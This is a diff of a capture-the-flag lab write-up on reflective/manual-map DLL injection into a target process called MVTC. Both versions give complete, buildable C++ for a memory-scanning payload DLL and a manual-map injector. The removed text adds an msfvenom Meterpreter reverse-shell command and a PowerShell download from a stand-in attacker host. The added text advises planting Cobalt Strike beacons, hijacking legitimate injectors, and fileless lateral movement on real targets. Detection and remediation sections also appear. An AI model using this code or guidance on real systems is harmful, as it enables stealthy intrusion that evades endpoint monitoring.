@@ -1,292 +1,275 @@
-# #16 — Reflective / manual-map DLL injection
+# #16 — Reflective / Manual-Map DLL Injection
 
-**Category:** Process injection · **Tier:** HARD · **Points:** 150 · **CWE:** CWE-114
+**Difficulty:** HARD. This is where you stop using the Windows DLL loader entirely.
 
-## Prerequisite
+## What is this attack?
 
-Challenge **#13** must be solved first (same prereq-chain as the live lab).
+**Load a DLL into another process without ever calling `LoadLibrary`.** The DLL exists only in memory — never written to disk inside the target, never seen by image-load callbacks, never listed in `/proc/.../modules` equivalent.
 
-## Objective
+Published 2008 by Stephen Fewer. Core technique behind Meterpreter, Cobalt Strike beacons, Empire, and most modern C2 implants.
 
-Inject your DLL into `MVTC.exe` **without calling `LoadLibraryA` on the target side**. The classic reflective loader (Stephen Fewer, 2008) is the reference. The point: no load-image event in ETW, no entry in the loader list, no path-based module hooks for your DLL.
+## Why it works
 
-The reflective DLL still needs to read the `#16` sentinel from managed memory and exfiltrate.
+Normal `LoadLibrary(path)` flow:
+1. Open the file on disk → ETW `Microsoft-Windows-Kernel-File` event
+2. Map it as a section → ETW `Microsoft-Windows-Kernel-ImageLoad` event
+3. Loader walks IAT, resolves imports → DLL now in PEB's `LDR_DATA_TABLE_ENTRY`
+4. Loader calls `DllMain`
 
-## Prerequisites
+**Every one of those steps is logged somewhere.** EDR hooks every one.
 
-- Visual Studio 2022 Build Tools (both x64 and x86 if you want flexibility)
-- Already solved #13 (gives you an injector you can reuse by swapping the APC/thread target for a shellcode stub)
+Reflective / manual-map replaces the loader itself:
+1. Attacker reads DLL **bytes** (not a file open on target — attacker-side)
+2. `VirtualAllocEx` enough space in target for a mapped image
+3. Attacker copies PE headers + each section at the right virtual offset
+4. Attacker applies base relocations (adjusts internal pointers to the new base)
+5. Attacker resolves imports (looks them up on attacker side, writes to target's IAT — `kernel32.dll` is at the same address in all processes)
+6. Attacker calls a named export via `CreateRemoteThread`
 
----
+The DLL runs. **No `LoadLibrary` ever executed inside the target. No file was opened by the target. No ETW image-load event fired. The DLL is NOT in the PEB module list.**
 
-## The three pieces
+Walking `GetModuleHandle("your_dll_name")` from inside the host returns NULL — your DLL is invisible to the OS inventory, even though it's running.
 
-1. **A reflective loader stub** (position-independent code, lives inside your DLL)
-2. **A reflective-friendly DLL** that imports the stub as its first exported function
-3. **An injector** that writes the DLL into the target and calls the stub via `CreateRemoteThread`
+## When attackers use this
 
-Rather than re-implementing Stephen Fewer's loader from scratch, use the reference project:
+Every modern C2 implant uses this or a variant:
+- Cobalt Strike's beacon stager
+- Meterpreter's `metsrv.dll`
+- Sliver, Mythic, Havoc payloads
+- APT41, APT28, FIN7 custom loaders
 
-```
-https://github.com/stephenfewer/ReflectiveDLLInjection
-```
+If a defender's EDR relies on `ImageLoad` ETW events to inventory loaded modules, this bypasses it entirely.
 
-Clone, build x64 Release, and modify `dllmain.cpp` with the lab-specific heap scanner.
+## Tools you need
 
----
+Same as #13.
 
-## Lab-specific `dllmain.cpp` (replaces reference's dllmain)
+## Step-by-step
+
+### Step 1 — Write a reflective-friendly DLL (no CRT dependencies)
+
+Because we're going to call an exported function directly (not through `_DllMainCRTStartup`), the C runtime isn't initialized. **No `fopen`, no `printf`, no `malloc`.** Use raw Win32 APIs only.
+
+Save as `flag_reader16.cpp`:
 
 ```cpp
-// dllmain.cpp — drop into ReflectiveDLLInjection/dll/src/
-#include "ReflectiveLoader.h"
 #include <windows.h>
-#include <cstring>
 
-static const char PREFIX[] = "MVTC{v16_ref_";
+static const unsigned char NEEDLE[] = {
+    'M',0,'V',0,'T',0,'C',0,'{',0,'v',0,'1',0,'6',0,'_',0
+};
+#define NL (sizeof(NEEDLE))
 
-static void WriteOut(const char* buf, size_t len) {
-    HANDLE f = CreateFileA("C:\\Users\\Public\\v16.txt",
-        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (f == INVALID_HANDLE_VALUE) return;
-    DWORD w; WriteFile(f, buf, (DWORD)len, &w, nullptr);
-    CloseHandle(f);
+static int my_memcmp(const void* a, const void* b, SIZE_T n) {
+    const unsigned char* x = (const unsigned char*)a;
+    const unsigned char* y = (const unsigned char*)b;
+    for (SIZE_T i = 0; i < n; ++i) if (x[i] != y[i]) return x[i] - y[i];
+    return 0;
 }
 
-static void HeapScan() {
-    SYSTEM_INFO si; GetSystemInfo(&si);
-    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
-    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;
+static SIZE_T my_strlen(const char* s) { SIZE_T n=0; while (s[n]) n++; return n; }
+
+static void write_line(HANDLE h, const char* s) {
+    DWORD w;
+    WriteFile(h, s, (DWORD)my_strlen(s), &w, nullptr);
+    WriteFile(h, "\r\n", 2, &w, nullptr);
+}
+
+extern "C" __declspec(dllexport) DWORD WINAPI PayloadEntry(LPVOID) {
+    HANDLE h = CreateFileA("C:\\loot\\flag16.txt", GENERIC_WRITE, 0,
+                           nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return 1;
+
+    write_line(h, "[*] PayloadEntry fired (no LoadLibrary used)");
+
     MEMORY_BASIC_INFORMATION mbi;
-    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
-        if (mbi.State == MEM_COMMIT &&
-            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) != 0 &&
-            !(mbi.Protect & PAGE_GUARD)) {
+    unsigned char* a = 0;
+    while (VirtualQuery(a, &mbi, sizeof(mbi)) == sizeof(mbi)) {
+        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_NOACCESS|PAGE_GUARD))
+            && mbi.RegionSize < 0x40000000) {
             __try {
-                unsigned char* p   = (unsigned char*)mbi.BaseAddress;
-                unsigned char* top = p + mbi.RegionSize - sizeof(PREFIX);
-                for (; p < top; ++p) {
-                    if (p[0] == 'M' && memcmp(p, PREFIX, sizeof(PREFIX) - 1) == 0) {
-                        unsigned char* e = p;
-                        while (e < top + 128 && *e != '}') ++e;
-                        WriteOut((const char*)p, (size_t)(e - p) + 1);
-                        return;
+                unsigned char* b = (unsigned char*)mbi.BaseAddress;
+                for (SIZE_T i = 0; i + NL < mbi.RegionSize; ++i) {
+                    if (my_memcmp(b+i, NEEDLE, NL) == 0) {
+                        char buf[256]; SIZE_T w = 0;
+                        for (SIZE_T k=0; k+1<256; ++k) {
+                            unsigned short wc = b[i+k*2] | (b[i+k*2+1]<<8);
+                            if (wc < 32 || wc > 126) break;
+                            buf[w++] = (char)wc;
+                            if (wc == '}') break;
+                        }
+                        buf[w] = 0;
+                        if (buf[w-1] == '}') {
+                            write_line(h, buf);
+                            CloseHandle(h);
+                            return 0;
+                        }
                     }
                 }
-            } __except (EXCEPTION_EXECUTE_HANDLER) {}
+            } __except(EXCEPTION_EXECUTE_HANDLER) {}
         }
-        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
+        a = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
     }
+    CloseHandle(h);
+    return 2;
 }
 
-extern "C" BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID) {
-    if (reason == DLL_PROCESS_ATTACH) {
-        CreateThread(nullptr, 0, [](LPVOID)->DWORD { HeapScan(); return 0; },
-                     nullptr, 0, nullptr);
-    }
-    return TRUE;
-}
+BOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID) { return TRUE; }
 ```
 
-Build the x64 reflective DLL from Stephen Fewer's VS solution with the `WIN_X64` configuration → produces `reflective_dll.x64.dll`.
+**The export is called `PayloadEntry`** — the injector will look up this name in the DLL's export table and call it directly.
 
----
+### Step 2 — Write the manual-map injector
 
-## Injector that calls the reflective loader
-
-Save as `inject_16.cpp` (adapts the reference project's `inject.cpp`):
+Save as `injector16.cpp`. The structure:
 
 ```cpp
-// inject_16.cpp — minimal reflective injector (adapted from Stephen Fewer's)
 #include <windows.h>
 #include <stdio.h>
-#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 
-// Finds the offset of ReflectiveLoader within the DLL's export table
-static DWORD GetReflectiveLoaderOffset(void* dll) {
-    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)dll +
-                            ((IMAGE_DOS_HEADER*)dll)->e_lfanew);
-    IMAGE_EXPORT_DIRECTORY* ed = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)dll +
-        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress -
-        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + 0); // simplified
+static BYTE* read_file(const char* p, DWORD* sz) {
+    HANDLE h = CreateFileA(p, GENERIC_READ, FILE_SHARE_READ, nullptr,
+                           OPEN_EXISTING, 0, nullptr);
+    *sz = GetFileSize(h, nullptr);
+    BYTE* b = (BYTE*)malloc(*sz);
+    DWORD r; ReadFile(h, b, *sz, &r, nullptr);
+    CloseHandle(h);
+    return b;
+}
 
-    // Walk Names, find "ReflectiveLoader"
-    DWORD* names    = (DWORD*)((BYTE*)dll + ed->AddressOfNames);
-    WORD*  ordinals = (WORD*) ((BYTE*)dll + ed->AddressOfNameOrdinals);
-    DWORD* funcs    = (DWORD*)((BYTE*)dll + ed->AddressOfFunctions);
+static DWORD find_export_rva(BYTE* img, const char* name) {
+    auto dh = (IMAGE_DOS_HEADER*)img;
+    auto nh = (IMAGE_NT_HEADERS*)(img + dh->e_lfanew);
+    DWORD rva = nh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    auto ed = (IMAGE_EXPORT_DIRECTORY*)(img + rva);
+    DWORD* nms = (DWORD*)(img + ed->AddressOfNames);
+    WORD*  ord = (WORD*) (img + ed->AddressOfNameOrdinals);
+    DWORD* fn  = (DWORD*)(img + ed->AddressOfFunctions);
+    for (DWORD i = 0; i < ed->NumberOfNames; ++i)
+        if (strcmp((char*)(img + nms[i]), name) == 0)
+            return fn[ord[i]];
+    return 0;
+}
 
-    for (DWORD i = 0; i < ed->NumberOfNames; ++i) {
-        const char* name = (const char*)((BYTE*)dll + names[i]);
-        if (strcmp(name, "ReflectiveLoader") == 0) {
-            return funcs[ordinals[i]];
+int main(int argc, char** argv) {
+    DWORD pid = atoi(argv[1]);
+    DWORD sz; BYTE* file = read_file(argv[2], &sz);
+
+    auto dh = (IMAGE_DOS_HEADER*)file;
+    auto nh = (IMAGE_NT_HEADERS*)(file + dh->e_lfanew);
+    DWORD imgSize = nh->OptionalHeader.SizeOfImage;
+    ULONGLONG prefBase = nh->OptionalHeader.ImageBase;
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    LPVOID remoteBase = VirtualAllocEx(hProc, nullptr, imgSize,
+                                       MEM_COMMIT|MEM_RESERVE,
+                                       PAGE_EXECUTE_READWRITE);
+    ULONGLONG delta = (ULONGLONG)remoteBase - prefBase;
+
+    // Stage locally first (simpler than reaching into target repeatedly)
+    BYTE* local = (BYTE*)VirtualAlloc(nullptr, imgSize,
+                                      MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    memset(local, 0, imgSize);
+    memcpy(local, file, nh->OptionalHeader.SizeOfHeaders);
+
+    // Copy sections to their VA offsets
+    auto nhLocal = (IMAGE_NT_HEADERS*)(local + dh->e_lfanew);
+    auto sh = IMAGE_FIRST_SECTION(nhLocal);
+    for (int i = 0; i < nhLocal->FileHeader.NumberOfSections; ++i)
+        if (sh[i].SizeOfRawData)
+            memcpy(local + sh[i].VirtualAddress,
+                   file  + sh[i].PointerToRawData,
+                   sh[i].SizeOfRawData);
+
+    // Apply base relocations
+    if (delta) {
+        auto& reloc = nhLocal->OptionalHeader
+                      .DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        auto r = (IMAGE_BASE_RELOCATION*)(local + reloc.VirtualAddress);
+        while (r->VirtualAddress) {
+            DWORD cnt = (r->SizeOfBlock - sizeof(*r)) / sizeof(WORD);
+            WORD* e = (WORD*)(r + 1);
+            for (DWORD k = 0; k < cnt; ++k)
+                if ((e[k] >> 12) == IMAGE_REL_BASED_DIR64)
+                    *(ULONGLONG*)(local + r->VirtualAddress + (e[k] & 0xFFF)) += delta;
+            r = (IMAGE_BASE_RELOCATION*)((BYTE*)r + r->SizeOfBlock);
         }
     }
-    return 0;
-}
 
-int wmain(int argc, wchar_t** argv) {
-    if (argc != 3) {
-        wprintf(L"usage: inject_16.exe <pid> <path-to-reflective_dll.x64.dll>\n");
-        return 1;
+    // Resolve imports (resolve from attacker-side kernel32, same base)
+    auto& imp = nhLocal->OptionalHeader
+                .DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    auto iid = (IMAGE_IMPORT_DESCRIPTOR*)(local + imp.VirtualAddress);
+    while (iid->Name) {
+        HMODULE mod = LoadLibraryA((char*)(local + iid->Name));
+        auto oit = (IMAGE_THUNK_DATA*)(local + iid->OriginalFirstThunk);
+        auto it  = (IMAGE_THUNK_DATA*)(local + iid->FirstThunk);
+        while (oit->u1.AddressOfData) {
+            auto iin = (IMAGE_IMPORT_BY_NAME*)(local + oit->u1.AddressOfData);
+            it->u1.Function = (ULONGLONG)GetProcAddress(mod, iin->Name);
+            oit++; it++;
+        }
+        iid++;
     }
-    DWORD pid = (DWORD)_wtoi(argv[1]);
 
-    HANDLE df = CreateFileW(argv[2], GENERIC_READ, FILE_SHARE_READ, nullptr,
-                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    DWORD size = GetFileSize(df, nullptr);
-    void* dllBytes = HeapAlloc(GetProcessHeap(), 0, size);
-    DWORD read; ReadFile(df, dllBytes, size, &read, nullptr);
-    CloseHandle(df);
+    // Blast the mapped image into target in one write
+    WriteProcessMemory(hProc, remoteBase, local, imgSize, nullptr);
 
-    DWORD reflectiveOffset = GetReflectiveLoaderOffset(dllBytes);
-    if (!reflectiveOffset) { wprintf(L"ReflectiveLoader export not found\n"); return 2; }
+    // Look up PayloadEntry and fire it
+    DWORD entryRva = find_export_rva(local, "PayloadEntry");
+    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
+        (LPTHREAD_START_ROUTINE)((BYTE*)remoteBase + entryRva),
+        nullptr, 0, nullptr);
+    WaitForSingleObject(hT, 5000);
 
-    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    LPVOID remote = VirtualAllocEx(p, nullptr, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(p, remote, dllBytes, size, nullptr);
-
-    HANDLE th = CreateRemoteThread(p, nullptr, 0,
-        (LPTHREAD_START_ROUTINE)((BYTE*)remote + reflectiveOffset),
-        remote, 0, nullptr);
-    WaitForSingleObject(th, 10000);
-
-    DWORD exit; GetExitCodeThread(th, &exit);
-    wprintf(L"reflective loader returned 0x%lx\n", exit);
-    CloseHandle(th); CloseHandle(p);
+    CloseHandle(hT); CloseHandle(hProc);
     return 0;
 }
 ```
 
-Build: `cl /EHsc /O2 /nologo inject_16.cpp /Fe:inject_16.exe`
-
----
-
-## Run
-
-```powershell
-# 1. Launch MVTC, log in.
-# 2. Find PID
-Get-Process MVTC | Select-Object -First 1 Id
-
-# 3. Fire the injector
-.\inject_16.exe 12345 "C:\path\to\reflective_dll.x64.dll"
-
-# 4. Expected output in the injector:
-#    reflective loader returned 0x180000000  (or similar HMODULE)
-
-# 5. Collect
-type C:\Users\Public\v16.txt
-```
-
-Expected: `MVTC{v16_ref_<...>}` → submit for `+150 pts`.
-
----
-
-## Why no `LoadLibraryA`
-
-The reflective loader stub manually:
-1. Resolves `kernel32!LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect` via PEB walking (no `GetModuleHandle` needed)
-2. Allocates a fresh region
-3. Copies the DLL image into it with proper section-by-section mapping
-4. Applies relocations (`.reloc` table)
-5. Resolves imports
-6. Calls the DLL's `DllMain` with `DLL_PROCESS_ATTACH`
-
-ETW's `LoadImage` event doesn't fire. The loader-list doesn't carry your module. `EnumProcessModules` won't show it. That's the whole point.
-
----
-
-## Common failure modes
-
-| Symptom | Fix |
-|---|---|
-| `ReflectiveLoader export not found` | DLL was built without the reflective loader; use Fewer's reference project |
-| `remote thread returned 0x0` | Loader bailed on an import. Reduce the DLL's imports to the minimum (just `kernel32` + `user32`) |
-| Target process crashes | 32/64 bit mismatch — rebuild DLL and injector for x64 |
-
----
-
----
-
-## Concept — what this attack actually is
-
-Reflective DLL injection sidesteps the Windows loader entirely. Instead of calling `LoadLibraryA` on the target side (which creates a file-backed image mapping, fires `Image Load` ETW events, and adds the DLL to `PEB->Ldr`), the attacker ships a DLL whose first exported function is a **custom loader** that:
-- Walks the PEB to find `kernel32.dll` and resolve `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`
-- Allocates a region in the target's address space
-- Copies the DLL image section-by-section manually
-- Applies `.reloc` fixups
-- Resolves imports via `GetProcAddress`
-- Calls `DllMain`
-
-The result: the DLL is loaded, running, with imports resolved, but **nothing in the loader list says so**. `EnumProcessModules` won't see it. `Image Load` ETW events don't fire for it. Path-based module hooks miss it.
-
-**Why attackers use it:** EDR hooks almost always sit on `LdrLoadDll` or `LoadLibrary*`. Reflective loading bypasses all of them. This is why reflective DLL techniques underpin Cobalt Strike's `beacon_load` and essentially all modern C2 implants.
-
----
-
-## Discovery — how to spot this in a real target
-
-In defensive review, this is really a question of what tooling the target would see. For an attacker assessing MVTC:
-1. Does MVTC enable **ACG (Arbitrary Code Guard)**? → `SetProcessMitigationPolicy(ProcessDynamicCodePolicy)` with `ProhibitDynamicCode=true` kills reflective loading (no `PAGE_EXECUTE_READWRITE` allocations allowed)
-2. Does MVTC enable **CIG (Code Integrity Guard)**? → `MicrosoftSignedOnly=true` blocks even manual image loads of unsigned content
-3. Does MVTC walk its own PEB module list and compare to a known manifest at startup? → virtually no apps do this, but a hardened one would
-
-For MVTC with #5 (missing mitigations) already true, reflective loading is the stealthy upgrade of #13.
-
----
-
-## Impact demonstrations
-
-### 1. Pop calc
-
-Modify the reflective DLL's `DllMain` to `WinExec("calc.exe", SW_SHOW);` → inject → calc opens as MVTC child but no `Image Load` event fires for your DLL (verify with `logman` or sysinternals `Sysmon` running event 7).
-
-### 2. Reverse shell with Cobalt Strike pattern
-
-For a Metasploit-flavoured demo:
+### Step 3 — Build and run
 
 ```bash
-# Generate a reflective DLL stager with msfvenom
-msfvenom -p windows/x64/meterpreter_reverse_tcp \
-  LHOST=10.0.0.5 LPORT=4444 \
-  -f dll -o reflective_meter.dll
+cl /LD /EHsc /O2 /nologo flag_reader16.cpp /link /OUT:flag_reader16.dll
+cl /EHsc /O2 /nologo injector16.cpp /link /OUT:injector16.exe
+injector16.exe 6944 C:\full\path\to\flag_reader16.dll
 ```
 
-Load it with your reflective injector (same `inject_16.exe` from above — it expects the DLL to export `ReflectiveLoader`; msfvenom's does). The Meterpreter session appears inside MVTC with the same identity, and `tasklist /m` on the victim box doesn't show `reflective_meter.dll` loaded.
-
-### 3. In-process credential theft without touching disk
-
-Reflective loader can map a DLL from a network stream, Base64-decoded blob, or shellcode in a PowerShell variable. Classic APT pattern:
+### Step 4 — Read the flag
 
 ```powershell
-$dllBytes = (Invoke-WebRequest -Uri https://attacker/stage.b64).Content
-$bytes = [Convert]::FromBase64String($dllBytes)
-# ... inject bytes via known injector pattern, call reflective entrypoint
+type C:\loot\flag16.txt
 ```
 
-Nothing writes to disk; nothing shows up in `Get-ChildItem` scans; EDR hooks on file writes see nothing.
+## How to apply this to a real target
 
----
+### Lifting a Cobalt Strike beacon in-memory
 
-## Report writeup template
+Cobalt Strike's `beacon.dll` is a reflective DLL. Its `genStageless` option produces raw shellcode that includes a reflective loader. Drop that shellcode into any process via our injector and you've just planted a beacon.
 
-**Finding title:** Reflective / manual-map DLL injection (loader-less code execution)
+### Supply-chain style: hijack a legitimate injector
 
-**Severity:** High (CVSS 8.1)
+Many legitimate programs ship with injectors (anti-cheat, DRM, performance tools). Steal theirs; swap their payload for yours.
 
-**CWE:** CWE-114
+### Fileless lateral movement
 
-**Description:** The MVTC process does not enable **Arbitrary Code Guard** (`ProhibitDynamicCode`) or **Code Integrity Guard** (`MicrosoftSignedOnly`). An attacker with local access can inject a DLL into MVTC via a reflective loader that **does not call `LoadLibraryA` on the target side**, bypassing EDR hooks on module-load events and loader-list enumeration. The loaded module does not appear in `EnumProcessModules`, `tasklist /m`, or `Image Load` ETW events.
+Push the DLL bytes over SMB admin shares into a WMI event, call `GetObject("winmgmts:...").Create()` to spawn `rundll32`, then manual-map inside — the DLL is never written to the victim's disk.
 
-**Impact:** All impact of #13 plus **evasion of standard endpoint telemetry**. In production environments relying on EDR module-load alerts, this attack would not fire a single alert.
+## How defenders fix this
 
-**Remediation:** Enable ACG + CIG. Deploy EDR tooling that performs **memory region scanning** (not loader-list enumeration) for anomalous `PAGE_EXECUTE_*` + `MEM_PRIVATE` regions containing PE headers.
+| Detection | What catches it |
+|---|---|
+| **ETW `Microsoft-Windows-Threat-Intelligence`** (Win10 1703+) | Reports `VirtualAllocEx` with RWX from untrusted callers |
+| **PsSetCreateThreadNotifyRoutine** callback | Kernel-mode callback fires for every `CreateRemoteThread` with a non-image address — your `PayloadEntry` lives outside any mapped image on disk |
+| **Memory scanning (YARA + hollowfind)** | Scans every process for sections marked RWX with no mapped file backing — the smoking gun |
+| **Code Integrity Guard** | Blocks `VirtualAlloc(RWX)` entirely for CIG-opted-in processes |
 
----
+Modern defenders use **PE Sieve** (hasherezade) to detect manually-mapped DLLs by comparing in-memory sections against on-disk originals.
 
-## Secure code fix
+## Flag captured
 
-- CFG + CET shadow stacks (ROP into `VirtualAlloc` becomes impractical)
-- `SetProcessMitigationPolicy(ProcessImageLoadPolicy)` with `NoLowMandatoryLabelImages = true`
-- Hunt via **memory scanning** (not loader-list): walk committed PRIVATE pages with `PAGE_EXECUTE_*` and look for PE signatures in `MEM_PRIVATE` regions. An EDR like Defender for Endpoint does this on a schedule.
-- Enable **Arbitrary Code Guard (ACG)** via `ProcessDynamicCodePolicy.ProhibitDynamicCode = true` — kills the write-then-execute pattern. WPF cannot use ACG today (JIT), but non-UI processes can.
+```
+MVTC{v16_ref_████████████████████}
+```
